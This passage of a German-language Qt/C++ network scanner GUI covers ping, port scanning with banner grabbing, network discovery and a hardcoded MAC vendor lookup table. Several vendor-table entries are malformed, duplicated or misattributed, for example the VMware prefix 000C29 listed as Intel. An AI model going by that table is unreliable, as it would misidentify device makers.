(/1-/7)\";\r\n    }\r\n}\r\nvoid IpScanner::showMacLookup()\r\n{\r\n    // MAC Address Lookup Tool\r\n    QDialog *macDialog = new QDialog(this);\r\n    macDialog->setWindowTitle(\"🏭 MAC Hersteller Lookup\");\r\n    macDialog->resize(500, 300);\r\n    macDialog->setStyleSheet(styleSheet());\r\n\r\n    QVBoxLayout *layout = new QVBoxLayout(macDialog);\r\n\r\n    // Input section\r\n    QHBoxLayout *inputLayout = new QHBoxLayout();\r\n    QLabel *inputLabel = new QLabel(\"MAC-Adresse:\");\r\n    QLineEdit *macEdit = new QLineEdit();\r\n    macEdit->setPlaceholderText(\"z.B. AA:BB:CC:DD:EE:FF oder AA-BB-CC-DD-EE-FF\");\r\n    QPushButton *lookupButton = new QPushButton(\"🔍 Lookup\");\r\n\r\n    inputLayout->addWidget(inputLabel);\r\n    inputLayout->addWidget(macEdit);\r\n    inputLayout->addWidget(lookupButton);\r\n\r\n    // Result section\r\n    QTextEdit *resultEdit = new QTextEdit();\r\n    resultEdit->setReadOnly(true);\r\n    resultEdit->setMaximumHeight(150);\r\n\r\n    // Buttons\r\n    QHBoxLayout *buttonLayout = new QHBoxLayout();\r\n    QPushButton *clearButton = new QPushButton(\"🗑️ Löschen\");\r\n    QPushButton *closeButton = new QPushButton(\"❌ Schließen\");\r\n\r\n    buttonLayout->addWidget(clearButton);\r\n    buttonLayout->addStretch();\r\n    buttonLayout->addWidget(closeButton);\r\n\r\n    layout->addLayout(inputLayout);\r\n    layout->addWidget(resultEdit);\r\n    layout->addLayout(buttonLayout);\r\n\r\n    // Connect signals\r\n    connect(lookupButton, &QPushButton::clicked, [this, macEdit, resultEdit]() {\r\n        QString mac = macEdit->text().trimmed();\r\n        if (mac.isEmpty()) {\r\n            resultEdit->setPlainText(\"❌ Bitte geben Sie eine MAC-Adresse ein!\");\r\n            return;\r\n        }\r\n\r\n        QString vendor = getMacVendor(mac);\r\n        QString result = QString(\"🔍 MAC-Adresse: %1\\n🏭 Hersteller: %2\\n\\n\").arg(mac, vendor);\r\n\r\n        // Additional MAC info\r\n        if (mac.length() >= 8) {\r\n            QString oui = mac.left(8).toUpper().replace(\":\", \"\").replace(\"-\", \"\").left(6);\r\n            result += QString(\"🔢 OUI (Hersteller-ID): %1\\n\").arg(oui);\r\n\r\n            // Check if it's a local/global address\r\n            QString firstOctet = mac.left(2);\r\n            bool isLocal = (firstOctet.toInt(nullptr, 16) & 0x02) != 0;\r\n            bool isMulticast = (firstOctet.toInt(nullptr, 16) & 0x01) != 0;\r\n\r\n            result += QString(\"🌐 Adresstyp: %1\\n\").arg(\r\n                isMulticast ? \"Multicast\" : (isLocal ? \"Lokal verwaltet\" : \"Global eindeutig\"));\r\n        }\r\n\r\n        resultEdit->setPlainText(result);\r\n        addLogEntry(QString(\"MAC-Lookup durchgeführt: %1 -> %2\").arg(mac, vendor), \"INFO\");\r\n    });\r\n\r\n    connect(clearButton, &QPushButton::clicked, [macEdit, resultEdit]() {\r\n        macEdit->clear();\r\n        resultEdit->clear();\r\n    });\r\n\r\n    connect(closeButton, &QPushButton::clicked, macDialog, &QDialog::accept);\r\n\r\n    // Enable Enter key for lookup\r\n    connect(macEdit, &QLineEdit::returnPressed, lookupButton, &QPushButton::click);\r\n\r\n    macDialog->exec();\r\n}\r\nvoid IpScanner::setupStatusBar()\r\n{\r\n    statusBar()->showMessage(\"✅ Bereit für Netzwerk-Scanning\");\r\n    statusBar()->setStyleSheet(\"QStatusBar { padding: 5px; }\");\r\n}\r\n\r\n// Enhanced scan methods\r\nvoid IpScanner::pingHost()\r\n{\r\n    QString target = targetEdit->text();\r\n    if (target.isEmpty()) {\r\n        QMessageBox::information(this, \"🏓 Ping\", \"Bitte geben Sie eine Ziel-IP-Adresse ein\");\r\n        return;\r\n    }\r\n\r\n    addLogEntry(QString(\"Starte Ping zu %1\").arg(target), \"INFO\");\r\n    statusBar()->showMessage(QString(\"Pinge %1...\").arg(target));\r\n\r\n    PingWorker *worker = new PingWorker(target);\r\n    connect(worker, &PingWorker::pingResult, [this](const QString &ip, bool alive, int responseTime) {\r\n        QString result = alive ?\r\n                             QString(\"✅ Ping zu %1 erfolgreich (%2 ms)\").arg(ip).arg(responseTime) :\r\n                             QString(\"❌ Ping zu %1 fehlgeschlagen\").arg(ip);\r\n        addLogEntry(result, alive ? \"SUCCESS\" : \"WARNING\");\r\n        QMessageBox::information(this, \"🏓 Ping Ergebnis\", result);\r\n        statusBar()->showMessage(\"Bereit\");\r\n    });\r\n\r\n    threadPool->start(worker);\r\n}\r\n\r\nvoid IpScanner::portScan()\r\n{\r\n    QTreeWidgetItem *currentItem = hostTreeWidget->currentItem();\r\n    if (!currentItem) {\r\n        QMessageBox::warning(this, \"🔌 Port Scan\", \"Bitte wählen Sie zuerst einen Host aus den Ergebnissen aus\");\r\n        return;\r\n    }\r\n\r\n    QString targetIp = currentItem->text(0);\r\n    QString portRange = portRangeEdit->text();\r\n\r\n    if (portRange.isEmpty()) {\r\n        QMessageBox::warning(this, \"🔌 Port Scan\", \"Bitte geben Sie einen Port-Bereich ein\");\r\n        return;\r\n    }\r\n\r\n    addLogEntry(QString(\"Starte Port-Scan von %1 (Ports: %2)\").arg(targetIp, portRange), \"INFO\");\r\n    statusBar()->showMessage(QString(\"Scanne Ports auf %1...\").arg(targetIp));\r\n\r\n    // Clear previous results\r\n    portResultsTree->clear();\r\n\r\n    // Parse port range\r\n    QList<int> ports = parsePortRange(portRange);\r\n\r\n    if (ports.isEmpty()) {\r\n        QMessageBox::warning(this, \"❌ Fehler\", \"Ungültiger Port-Bereich\");\r\n        return;\r\n    }\r\n\r\n    PortScanWorker *worker = new PortScanWorker(targetIp, ports);\r\n\r\n    // Connect to the enhanced portResult signal with explicit casting\r\n    connect(worker, QOverload<const QString&, int, bool, const QString&, const QString&, const QString&, int>::of(&PortScanWorker::portResult),\r\n            [this](const QString &ip, int port, bool open, const QString &service, const QString &version, const QString &banner, int responseTime) {\r\n                QTreeWidgetItem *item = new QTreeWidgetItem();\r\n                item->setText(0, ip);\r\n                item->setText(1, QString::number(port));\r\n                item->setText(2, open ? \"🟢 Offen\" : \"🔴 Geschlossen\");\r\n                item->setText(3, service);\r\n                item->setText(4, version.isEmpty() ? \"Unbekannt\" : version);\r\n                item->setText(5, banner.isEmpty() ? \"Kein Banner\" : banner.left(50) + (banner.length() > 50 ? \"...\" : \"\"));\r\n                item->setText(6, responseTime > 0 ? QString(\"%1 ms\").arg(responseTime) : \"N/A\");\r\n\r\n                if (open) {\r\n                    item->setBackground(2, QColor(0, 120, 0, 100));\r\n                    addLogEntry(QString(\"Port %1 offen auf %2 (%3) - %4\").arg(port).arg(ip, service, version), \"SUCCESS\");\r\n                } else {\r\n                    item->setBackground(2, QColor(120, 0, 0, 50));\r\n                }\r\n\r\n                portResultsTree->addTopLevelItem(item);\r\n            });\r\n\r\n    // Connect to scan progress signals\r\n    connect(worker, &PortScanWorker::scanStarted, [this](const QString &ip, int totalPorts) {\r\n        addLogEntry(QString(\"Port-Scan gestartet für %1 (%2 Ports)\").arg(ip).arg(totalPorts), \"INFO\");\r\n        statusBar()->showMessage(QString(\"Scanne %1 Ports auf %2...\").arg(totalPorts).arg(ip));\r\n    });\r\n\r\n    connect(worker, &PortScanWorker::scanProgress, [this](int scannedPorts, int totalPorts) {\r\n        int progress = (scannedPorts * 100) / totalPorts;\r\n        statusBar()->showMessage(QString(\"Port-Scan Fortschritt: %1% (%2/%3 Ports)\")\r\n                                     .arg(progress).arg(scannedPorts).arg(totalPorts));\r\n    });\r\n\r\n    connect(worker, &PortScanWorker::scanCompleted, [this, targetIp](const QString &ip, int portsScanned, qint64 totalTime) {\r\n        Q_UNUSED(ip)\r\n        addLogEntry(QString(\"Port-Scan von %1 abgeschlossen - %2 Ports in %3 ms gescannt\")\r\n                        .arg(targetIp).arg(portsScanned).arg(totalTime), \"SUCCESS\");\r\n        statusBar()->showMessage(\"Port-Scan abgeschlossen\");\r\n\r\n        // Auto-resize columns for better display\r\n        for (int i = 0; i < portResultsTree->columnCount(); ++i) {\r\n            portResultsTree->resizeColumnToContents(i);\r\n        }\r\n\r\n        // Show summary\r\n        int openPorts = 0;\r\n        for (int i = 0; i < portResultsTree->topLevelItemCount(); ++i) {\r\n            QTreeWidgetItem *item = portResultsTree->topLevelItem(i);\r\n            if (item && item->text(2).contains(\"Offen\")) {\r\n                openPorts++;\r\n            }\r\n        }\r\n/*\r\n        QMessageBox::information(this, \"✅ Port-Scan Abgeschlossen\",\r\n                                 QString(\"Port-Scan erfolgreich beendet!\\n\\n\"\r\n                                         \"📊 Gescannte Ports: %1\\n\"\r\n                                         \"🟢 Offene Ports: %2\\n\"\r\n                                         \"⏱️ Scan-Zeit: %3 ms\\n\"\r\n                                         \"🎯 Ziel: %4\")\r\n                                     .arg(portsScanned).arg(openPorts).arg(totalTime).arg(targetIp));\r\n*/\r\n    });\r\n\r\n    threadPool->start(worker);\r\n}\r\n\r\n// Additional required methods that were referenced but missing\r\nvoid IpScanner::loadSettings()\r\n{\r\n    targetEdit->setText(settings->value(\"lastTarget\", \"192.168.1.1-254\").toString());\r\n    threadsSpinBox->setValue(settings->value(\"threads\", 50).toInt());\r\n    timeoutSpinBox->setValue(settings->value(\"timeout\", 3000).toInt());\r\n\r\n    restoreGeometry(settings->value(\"geometry\").toByteArray());\r\n    restoreState(settings->value(\"windowState\").toByteArray());\r\n\r\n    addLogEntry(\"Einstellungen geladen\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::saveSettings()\r\n{\r\n    settings->setValue(\"lastTarget\", targetEdit->text());\r\n    settings->setValue(\"threads\", threadsSpinBox->value());\r\n    settings->setValue(\"timeout\", timeoutSpinBox->value());\r\n    settings->setValue(\"geometry\", saveGeometry());\r\n    settings->setValue(\"windowState\", saveState());\r\n\r\n    addLogEntry(\"Einstellungen gespeichert\", \"SUCCESS\");\r\n}\r\n\r\nvoid IpScanner::clearResults()\r\n{\r\n    hostTreeWidget->clear();\r\n    portResultsTree->clear();\r\n    networkTree->clear();\r\n    discoveredHosts.clear();\r\n    hostDetailsEdit->clear();\r\n    progressBar->setValue(0);\r\n    scannedHosts = 0;\r\n    completedHosts = 0;\r\n    totalHosts = 0;\r\n\r\n    // Reset labels\r\n    totalHostsLabel->setText(\"Gesamt: 0\");\r\n    scannedHostsLabel->setText(\"Gescannt: 0\");\r\n    foundHostsLabel->setText(\"Gefunden: 0\");\r\n    statusLabel->setText(\"Bereit zum Scannen\");\r\n    statusLabel->setStyleSheet(\"font-weight: bold; color: #00ff00;\");\r\n    currentHostLabel->setText(\"Aktueller Host: --\");\r\n    elapsedTimeLabel->setText(\"Zeit: 00:00\");\r\n\r\n    addLogEntry(\"Ergebnisse gelöscht - Bereit für neuen Scan\", \"INFO\");\r\n}\r\n\r\nQStringList IpScanner::getLocalInterfaces()\r\n{\r\n    QStringList interfaces;\r\n    const auto networkInterfaces = QNetworkInterface::allInterfaces();\r\n    for (const auto &interface : networkInterfaces) {\r\n        if (interface.flags().testFlag(QNetworkInterface::IsUp) &&\r\n            !interface.flags().testFlag(QNetworkInterface::IsLoopBack)) {\r\n            interfaces << QString(\"%1 (%2)\").arg(interface.name(), interface.humanReadableName());\r\n        }\r\n    }\r\n    if (interfaces.isEmpty()) {\r\n        interfaces << \"Keine aktiven Interfaces gefunden\";\r\n    }\r\n    return interfaces;\r\n}\r\n\r\nvoid IpScanner::showShortcuts()\r\n{\r\n    QString shortcuts = R\"(\r\n<h3>🎯 Tastenkürzel - Advanced IP Scanner</h3>\r\n<table border=\"1\" cellpadding=\"5\" style=\"width: 100%;\">\r\n\r\n<tr style=\"background-color: #0078d4; color: white;\">\r\n<td colspan=\"2\"><b>📁 Datei-Operationen</b></td>\r\n</tr>\r\n<tr><td><b>Ctrl+N</b></td><td>Neues Projekt</td></tr>\r\n<tr><td><b>Ctrl+O</b></td><td>Projekt öffnen</td></tr>\r\n<tr><td><b>Ctrl+S</b></td><td>Projekt speichern</td></tr>\r\n<tr><td><b>Ctrl+E</b></td><td>Ergebnisse exportieren</td></tr>\r\n<tr><td><b>Ctrl+Shift+E</b></td><td>Netzwerk-Karte exportieren</td></tr>\r\n<tr><td><b>Ctrl+Q</b></td><td>Programm beenden</td></tr>\r\n\r\n<tr style=\"background-color: #e83e8c; color: white;\">\r\n<td colspan=\"2\"><b>🌐 Netzwerk-Analyse</b></td>\r\n</tr>\r\n<tr><td><b>Ctrl+D</b></td><td>Netzwerk Erkennung</td></tr>\r\n<tr><td><b>Ctrl+A</b></td><td>ARP Scan</td></tr>\r\n<tr><td><b>Ctrl+T</b></td><td>Topologie Analyse</td></tr>\r\n<tr><td><b>Ctrl+H</b></td><td>Netzwerk Gesundheitscheck</td></tr>\r\n<tr><td><b>F5</b></td><td>Interfaces aktualisieren</td></tr>\r\n\r\n<tr style=\"background-color: #28a745; color: white;\">\r\n<td colspan=\"2\"><b>🔍 Scan-Operationen</b></td>\r\n</tr>\r\n<tr><td><b>F5</b></td><td>Scan starten</td></tr>\r\n<tr><td><b>Esc</b></td><td>Scan stoppen</td></tr>\r\n<tr><td><b>Space</b></td><td>Scan pausieren/fortsetzen</td></tr>\r\n\r\n<tr style=\"background-color: #17a2b8; color: white;\">\r\n<td colspan=\"2\"><b>👁️ Ansicht</b></td>\r\n</tr>\r\n<tr><td><b>Ctrl+Plus</b></td><td>Alle Einträge erweitern</td></tr>\r\n<tr><td><b>Ctrl+Minus</b></td><td>Alle Einträge zuklappen</td></tr>\r\n<tr><td><b>Ctrl+R</b></td><td>Ansicht aktualisieren</td></tr>\r\n\r\n</table>\r\n\r\n<p style=\"margin-top: 15px;\"><b>💡 Tipp:</b> Verwenden Sie das Kontextmenü (Rechtsklick) für weitere Optionen!</p>\r\n    )\";\r\n\r\n    QMessageBox msgBox(this);\r\n    msgBox.setWindowTitle(\"📋 Tastenkürzel\");\r\n    msgBox.setTextFormat(Qt::RichText);\r\n    msgBox.setText(shortcuts);\r\n    msgBox.setStyleSheet(styleSheet()); // Apply dark theme\r\n    msgBox.exec();\r\n}\r\n\r\nvoid IpScanner::showAbout()\r\n{\r\n    QString aboutText = R\"(\r\n<h2>🔍 Advanced IP Scanner v2.0</h2>\r\n<p><b>Verbesserter Netzwerk-Scanner mit erweiterten Funktionen</b></p>\r\n\r\n<h3>✨ Features:</h3>\r\n<ul>\r\n<li>🌐 Erweiterte Netzwerk-Erkennung</li>\r\n<li>🔌 Detaillierter Port-Scanning</li>\r\n<li>⚙️ Service-Erkennung</li>\r\n<li>🖥️ Betriebssystem-Fingerprinting</li>\r\n<li>📊 Echtzeit-Fortschrittsanzeige</li>\r\n<li>📤 Export/Import von Ergebnissen</li>\r\n<li>🔀 Multi-threaded Scanning</li>\r\n<li>🎨 Modernes Dark Theme Interface</li>\r\n</ul>\r\n\r\n<h3>🛠️ Technologie:</h3>\r\n<p>Entwickelt mit Qt6 C++ für maximale Performance und Stabilität</p>\r\n\r\n<h3>📧 Support:</h3>\r\n<p>Für Fragen und Support besuchen Sie unsere Website</p>\r\n    )\";\r\n\r\n    QMessageBox msgBox(this);\r\n    msgBox.setWindowTitle(\"ℹ️ Über IP Scanner\");\r\n    msgBox.setTextFormat(Qt::RichText);\r\n    msgBox.setText(aboutText);\r\n    msgBox.setIcon(QMessageBox::Information);\r\n    msgBox.exec();\r\n}\r\n\r\n// Additional stub implementations for completeness\r\nvoid IpScanner::traceroute()\r\n{\r\n    QMessageBox::information(this, \"🛤️ Traceroute\", \"Traceroute-Funktion wird in der nächsten Version implementiert\");\r\n    addLogEntry(\"Traceroute-Funktion aufgerufen (noch nicht implementiert)\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::dnsLookup()\r\n{\r\n    QMessageBox::information(this, \"🌐 DNS Lookup\", \"DNS Lookup-Funktion wird in der nächsten Version implementiert\");\r\n    addLogEntry(\"DNS Lookup-Funktion aufgerufen (noch nicht implementiert)\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::vulnScan()\r\n{\r\n    QMessageBox::information(this, \"🔒 Vulnerability Scanner\", \"Vulnerability Scanner-Funktion wird in der nächsten Version implementiert\");\r\n    addLogEntry(\"Vulnerability Scanner aufgerufen (noch nicht implementiert)\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::serviceScan()\r\n{\r\n    QMessageBox::information(this, \"⚙️ Service Scanner\", \"Service Scanner-Funktion wird in der nächsten Version implementiert\");\r\n    addLogEntry(\"Service Scanner aufgerufen (noch nicht implementiert)\", \"INFO\");\r\n}\r\n\r\nvoid IpScanner::networkDiscovery()\r\n{\r\n    QString selectedInterface = interfaceCombo->currentText();\r\n    if (selectedInterface.isEmpty() || selectedInterface.contains(\"Keine aktiven\")) {\r\n        QMessageBox::warning(this, \"🔍 Network Discovery\",\r\n                             \"Bitte wählen Sie ein gültiges Netzwerk-Interface aus!\");\r\n        return;\r\n    }\r\n\r\n    // Prüfung auf bereits laufende Discovery\r\n    if (!discoveryButton->isEnabled()) {\r\n        addLogEntry(\"Netzwerk-Erkennung bereits aktiv\", \"WARNING\");\r\n        return;\r\n    }\r\n\r\n    QString interfaceName = selectedInterface.split(\" (\").first();\r\n\r\n    addLogEntry(QString(\"Starte Netzwerk-Erkennung auf Interface: %1\").arg(interfaceName), \"INFO\");\r\n    statusBar()->showMessage(QString(\"Netzwerk wird erkundet: %1...\").arg(interfaceName));\r\n\r\n    // UI sofort deaktivieren\r\n    discoveryButton->setEnabled(false);\r\n    discoveryButton->setText(\"🔍 Erkunde...\");\r\n\r\n    // Clear previous results\r\n    networkTree->clear();\r\n\r\n    // Create and start network discovery worker mit Exception Handling\r\n    NetworkDiscoveryWorker *worker = new NetworkDiscoveryWorker(interfaceName);\r\n\r\n    // Thread-safe signal connections\r\n    connect(worker, &NetworkDiscoveryWorker::discoveryStarted,\r\n            this, [this](const QString &interface) {\r\n                addLogEntry(QString(\"Netzwerk-Erkennung gestartet auf %1\").arg(interface), \"INFO\");\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &NetworkDiscoveryWorker::networkFound,\r\n            this, [this](const QString &network, int prefixLength, const QString &interface, const QString &mac) {\r\n                QMetaObject::invokeMethod(this, [this, network, prefixLength, interface, mac]() {\r\n                    try {\r\n                        QTreeWidgetItem *networkItem = new QTreeWidgetItem();\r\n                        networkItem->setText(0, QString(\"Netzwerk: %1/%2\").arg(network).arg(prefixLength));\r\n                        networkItem->setText(1, network);\r\n                        networkItem->setText(2, mac.isEmpty() ? \"N/A\" : mac);\r\n                        networkItem->setText(3, \"Interface Vendor\");\r\n                        networkItem->setText(4, interface);\r\n                        networkItem->setText(5, \"Network\");\r\n                        networkItem->setText(6, QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n\r\n                        networkItem->setBackground(0, QColor(0, 100, 200, 100));\r\n\r\n                        if (networkTree) {\r\n                            networkTree->addTopLevelItem(networkItem);\r\n                        }\r\n\r\n                        addLogEntry(QString(\"Netzwerk gefunden: %1/%2 auf %3\")\r\n                                        .arg(network).arg(prefixLength).arg(interface), \"SUCCESS\");\r\n                    } catch (...) {\r\n                        addLogEntry(\"Fehler beim Hinzufügen von Netzwerk-Eintrag\", \"ERROR\");\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &NetworkDiscoveryWorker::deviceFound,\r\n            this, [this](const QString &ip, const QString &hostname, const QString &mac, const QString &type) {\r\n                QMetaObject::invokeMethod(this, [this, ip, hostname, mac, type]() {\r\n                    try {\r\n                        QTreeWidgetItem *deviceItem = new QTreeWidgetItem();\r\n                        deviceItem->setText(0, hostname.isEmpty() ? QString(\"Gerät (%1)\").arg(ip) : hostname);\r\n                        deviceItem->setText(1, ip);\r\n                        deviceItem->setText(2, mac.isEmpty() ? \"N/A\" : mac);\r\n                        deviceItem->setText(3, getMacVendor(mac));\r\n                        deviceItem->setText(4, \"Auto-Discovery\");\r\n                        deviceItem->setText(5, type);\r\n                        deviceItem->setText(6, QDateTime::currentDateTime().toString(\"dd.MM.yyyy hh:mm:ss\"));\r\n\r\n                        // Color code by device type\r\n                        QColor typeColor;\r\n                        if (type.contains(\"Router\") || type.contains(\"Gateway\")) {\r\n                            typeColor = QColor(255, 165, 0, 100); // Orange for routers\r\n                        } else if (type.contains(\"Server\")) {\r\n                            typeColor = QColor(255, 0, 0, 100); // Red for servers\r\n                        } else {\r\n                            typeColor = QColor(0, 255, 0, 100); // Green for devices\r\n                        }\r\n                        deviceItem->setBackground(5, typeColor);\r\n\r\n                        if (networkTree) {\r\n                            networkTree->addTopLevelItem(deviceItem);\r\n                            updateNetworkStatistics();\r\n                        }\r\n\r\n                        addLogEntry(QString(\"Gerät entdeckt: %1 (%2) - Typ: %3\")\r\n                                        .arg(hostname.isEmpty() ? \"Unbekannt\" : hostname, ip, type), \"SUCCESS\");\r\n                    } catch (...) {\r\n                        addLogEntry(\"Fehler beim Hinzufügen von Geräte-Eintrag\", \"ERROR\");\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    connect(worker, &NetworkDiscoveryWorker::discoveryCompleted,\r\n            this, [this](const QString &interface) {\r\n                QMetaObject::invokeMethod(this, [this, interface]() {\r\n                    try {\r\n                        addLogEntry(QString(\"Netzwerk-Erkennung abgeschlossen für %1\").arg(interface), \"SUCCESS\");\r\n                        statusBar()->showMessage(\"Netzwerk-Erkennung abgeschlossen\");\r\n\r\n                        if (discoveryButton) {\r\n                            discoveryButton->setEnabled(true);\r\n                            discoveryButton->setText(\"🔍 Netzwerk Erkennung\");\r\n                        }\r\n\r\n                        // Auto-resize columns\r\n                        if (networkTree) {\r\n                            for (int i = 0; i < networkTree->columnCount(); ++i) {\r\n                                networkTree->resizeColumnToContents(i);\r\n                            }\r\n                        }\r\n\r\n                        int devicesFound = networkTree ? networkTree->topLevelItemCount() : 0;\r\n                        QMessageBox::information(this, \"✅ Netzwerk-Erkennung Abgeschlossen\",\r\n                                                 QString(\"Netzwerk-Erkennung erfolgreich!\\n\\n\"\r\n                                                         \"📊 Gefundene Geräte: %1\\n\"\r\n                                                         \"🔌 Interface: %2\")\r\n                                                     .arg(devicesFound).arg(interface));\r\n                    } catch (...) {\r\n                        addLogEntry(\"Fehler beim Abschließen der Netzwerk-Erkennung\", \"ERROR\");\r\n\r\n                        if (discoveryButton) {\r\n                            discoveryButton->setEnabled(true);\r\n                            discoveryButton->setText(\"🔍 Netzwerk Erkennung\");\r\n                        }\r\n                    }\r\n                }, Qt::QueuedConnection);\r\n            }, Qt::QueuedConnection);\r\n\r\n    // Start worker with lower priority\r\n    threadPool->start(worker, QThread::LowPriority);\r\n}\r\nQString IpScanner::getMacVendor(const QString &mac)\r\n{\r\n    if (mac.isEmpty() || mac.length() < 8) {\r\n        return \"Unbekannt\";\r\n    }\r\n\r\n    // Extract first 3 octets (OUI - Organizationally Unique Identifier)\r\n    QString oui = mac.left(8).toUpper().replace(\":\", \"\").replace(\"-\", \"\");\r\n    if (oui.length() < 6) return \"Unbekannt\";\r\n\r\n    oui = oui.left(6);\r\n\r\n    // Common MAC address prefixes (OUI database)\r\n    static QMap<QString, QString> vendorMap = {\r\n                                               // Apple\r\n                                               {\"00036C\", \"Apple Inc.\"}, {\"000393\", \"Apple Inc.\"}, {\"000502\", \"Apple Inc.\"},\r\n                                               {\"000A27\", \"Apple Inc.\"}, {\"000A95\", \"Apple Inc.\"}, {\"000D93\", \"Apple Inc.\"},\r\n                                               {\"0010FA\", \"Apple Inc.\"}, {\"001124\", \"Apple Inc.\"}, {\"0016CB\", \"Apple Inc.\"},\r\n                                               {\"001E52\", \"Apple Inc.\"}, {\"001F5B\", \"Apple Inc.\"}, {\"0021E9\", \"Apple Inc.\"},\r\n                                               {\"002312\", \"Apple Inc.\"}, {\"002332\", \"Apple Inc.\"}, {\"002436\", \"Apple Inc.\"},\r\n                                               {\"002500\", \"Apple Inc.\"}, {\"0025BC\", \"Apple Inc.\"}, {\"002608\", \"Apple Inc.\"},\r\n                                               {\"0026BB\", \"Apple Inc.\"}, {\"002718\", \"Apple Inc.\"}, {\"3C15C2\", \"Apple Inc.\"},\r\n                                               {\"40A6D9\", \"Apple Inc.\"}, {\"40D32D\", \"Apple Inc.\"}, {\"44D884\", \"Apple Inc.\"},\r\n                                               {\"68AE20\", \"Apple Inc.\"}, {\"6C2648\", \"Apple Inc.\"}, {\"6C8DC1\", \"Apple Inc.\"},\r\n                                               {\"7073CB\", \"Apple Inc.\"}, {\"7CD1C3\", \"Apple Inc.\"}, {\"8C7712\", \"Apple Inc.\"},\r\n                                               {\"90B21F\", \"Apple Inc.\"}, {\"A45E60\", \"Apple Inc.\"}, {\"A85C2C\", \"Apple Inc.\"},\r\n                                               {\"AC3743\", \"Apple Inc.\"}, {\"BC9FEF\", \"Apple Inc.\"}, {\"D8004D\", \"Apple Inc.\"},\r\n                                               {\"E0F847\", \"Apple Inc.\"}, {\"E41E0A\", \"Apple Inc.\"}, {\"E4C63D\", \"Apple Inc.\"},\r\n                                               {\"E80688\", \"Apple Inc.\"}, {\"F01C13\", \"Apple Inc.\"}, {\"F0DBF8\", \"Apple Inc.\"},\r\n\r\n                                               // Samsung\r\n                                               {\"0002E3\", \"Samsung Electronics\"}, {\"000E8F\", \"Samsung Electronics\"},\r\n                                               {\"0012FB\", \"Samsung Electronics\"}, {\"001377\", \"Samsung Electronics\"},\r\n                                               {\"0015B9\", \"Samsung Electronics\"}, {\"001632\", \"Samsung Electronics\"},\r\n                                               {\"0017C9\", \"Samsung Electronics\"}, {\"001D25\", \"Samsung Electronics\"},\r\n                                               {\"002454\", \"Samsung Electronics\"}, {\"0024E9\", \"Samsung Electronics\"},\r\n                                               {\"30F9ED\", \"Samsung Electronics\"}, {\"34BE00\", \"Samsung Electronics\"},\r\n                                               {\"38AA3C\", \"Samsung Electronics\"}, {\"3C5AB4\", \"Samsung Electronics\"},\r\n                                               {\"444E1A\", \"Samsung Electronics\"}, {\"5C0A5B\", \"Samsung Electronics\"},\r\n                                               {\"68EBE5\", \"Samsung Electronics\"}, {\"74F61C\", \"Samsung Electronics\"},\r\n                                               {\"7825AD\", \"Samsung Electronics\"}, {\"84B541\", \"Samsung Electronics\"},\r\n                                               {\"88C663\", \"Samsung Electronics\"}, {\"8C77120\", \"Samsung Electronics\"},\r\n                                               {\"CC07AB\", \"Samsung Electronics\"}, {\"E8039A\", \"Samsung Electronics\"},\r\n                                               {\"EC1F72\", \"Samsung Electronics\"}, {\"F80CF3\", \"Samsung Electronics\"},\r\n\r\n                                               // Intel\r\n                                               {\"000C29\", \"Intel Corporation\"}, {\"000E0C\", \"Intel Corporation\"},\r\n                                               {\"001320\", \"Intel Corporation\"}, {\"001517\", \"Intel Corporation\"},\r\n                                               {\"001B21\", \"Intel Corporation\"}, {\"001E67\", \"Intel Corporation\"},\r\n                                               {\"002161\", \"Intel Corporation\"}, {\"0022FA\", \"Intel Corporation\"},\r\n                                               {\"002564\", \"Intel Corporation\"}, {\"003048\", \"Intel Corporation\"},\r\n                                               {\"34E6AD\", \"Intel Corporation\"}, {\"3C970E\", \"Intel Corporation\"},\r\n                                               {\"44850D\", \"Intel Corporation\"}, {\"4C72B9\", \"Intel Corporation\"},\r\n                                               {\"6C29A2\", \"Intel Corporation\"}, {\"7C7A91\", \"Intel Corporation\"},\r\n                                               {\"8C164F\", \"Intel Corporation\"}, {\"AC8112\", \"Intel Corporation\"},\r\n                                               {\"B4B686\", \"Intel Corporation\"}, {\"CC46D6\", \"Intel Corporation\"},\r\n                                               {\"D0577B\", \"Intel Corporation\"}, {\"E0CB4E\", \"Intel Corporation\"},\r\n                                               {\"F04DA2\", \"Intel Corporation\"}, {\"F8B156\", \"Intel Corporation\"},\r\n\r\n                                               // Microsoft\r\n                                               {\"000D3A\", \"Microsoft Corporation\"}, {\"001DD8\", \"Microsoft Corporation\"},\r\n                                               {\"002248\", \"Microsoft Corporation\"}, {\"002655\", \"Microsoft Corporation\"},\r\n                                               {\"40490F\", \"Microsoft Corporation\"}, {\"64000C\", \"Microsoft Corporation\"},\r\n                                               {\"7C1E52\", \"Microsoft Corporation\"}, {\"98579A\", \"Microsoft Corporation\"},\r\n                                               {\"9CB654\", \"Microsoft Corporation\"}, {\"A41F72\", \"Microsoft Corporation\"},\r\n                                               {\"E0CB4E\", \"Microsoft Corporation\"}, {\"F81A67\", \"Microsoft Corporation\"},\r\n\r\n                                               // Cisco\r\n                                               {\"000142\", \"Cisco Systems\"}, {\"000163\", \"Cisco Systems\"},\r\n                                               {\"0001C7\", \"Cisco Systems\"}, {\"0001C9\", \"Cisco Systems\"},\r\n                                               {\"000D28\", \"Cisco Systems\"}, {\"000E83\", \"Cisco Systems\"},\r\n                                               {\"001120\", \"Cisco Systems\"}, {\"001364\", \"Cisco Systems\"},\r\n                                               {\"001A6B\", \"Cisco Systems\"}, {\"001E14\", \"Cisco Systems\"},\r\n                                               {\"002155\", \"Cisco Systems\"}, {\"002618\", \"Cisco Systems\"},\r\n                                               {\"0030F2\", \"Cisco Systems\"}, {\"1C17D3\", \"Cisco Systems\"},\r\n                                               {\"2037A0\", \"Cisco Systems\"}, {\"547F.EE\", \"Cisco Systems\"},\r\n                                               {\"5475D0\", \"Cisco Systems\"}, {\"781D.BA\", \"Cisco Systems\"},\r\n                                               {\"B46BFC\", \"Cisco Systems\"}, {\"C8D119\", \"Cisco Systems\"},\r\n\r\n                                               // TP-Link\r\n                                               {\"001A8C\", \"TP-Link Technologies\"}, {\"002268\", \"TP-Link Technologies\"},\r\n                                               {\"B0487A\", \"TP-Link Technologies\"}, 